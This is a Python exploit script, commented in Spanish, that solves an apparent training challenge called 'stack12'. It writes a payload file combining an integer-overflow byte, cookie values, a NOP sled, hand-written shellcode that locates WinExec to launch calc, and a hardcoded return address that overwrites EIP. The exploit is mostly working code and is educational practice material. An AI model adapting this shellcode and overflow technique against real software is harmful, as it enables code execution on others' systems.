#Solucion reto stack12 by hdbreaker
#http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/015%20stack12.idb/
import os
import struct

inputNum = "\x80" #Integer Overflow #=> este valor se utiliza luego para colocar en 0x40 el flProtect (se divide por 2)
cookie2 = struct.pack("<I", 0x45464748)
cookie1 = struct.pack("<I", 0x25262728)
cookie3 = struct.pack("<I", 0x0000003C) #Size of buffer

#Shellcode
#MOV ESI, 10102000 #Puntero a VirtualAlloc
#MOV ESI, [ESI]    #Direccion de kernel32.VirtualAlloc
#SUB ESI,052FB6    #Resto a kernel32.VirtualAlloc para caer en el BaseImage de Kernel32
#ADD ESI,08E5FD    #Sumo a Base Image la distancia de kernel32.WinExec
#PUSH 63616c63     #Pusheo al stack calc
#POP  EAX		   #Coloco calc en EAX
#PUSH 10103100     #Direccion escribible en idata seguida de ceros
#POP  ECX		   #Coloco en ECX 10103020
#MOV [ECX], EAX    #Copio calc en donde apunta 10103020
#PUSH ECX		   #Coloco ECX en el stack para usarlo como parametro de WinExec
#CALL ESI 		   #Llamo a WinExec
#RETN			   #Ret end

nopsleed = "\x90"*5
shellcode = "\xBE\x00\x20\x10\x10\x8B\x36\x81\xEE\xB6\x2F\x05\x00\x81\xC6\xFD\xE5\x08\x00\x68\x63\x61\x6c\x63\x58\x68\x00\x31\x10\x10\x59\x89\x01\x51\xFF\xD6\xC3" #37 bytes
buf = "\x90"*10 
s = "BBBB"
#TODO: usar el gadget jmp [esi-74] y no harcodear la direccion del stack o sobre escribir el pVirtualAlloc con algun rop y mov de 10103020
r = struct.pack("<I", 0x0012FF08) # => Controlo EIP (Puntero a mi shellcode en el stack)


payload = inputNum+cookie2+cookie1+cookie3+nopsleed+shellcode+buf+s+r

f = open("fichero.dat", "w")
f.write(payload)
f.close()
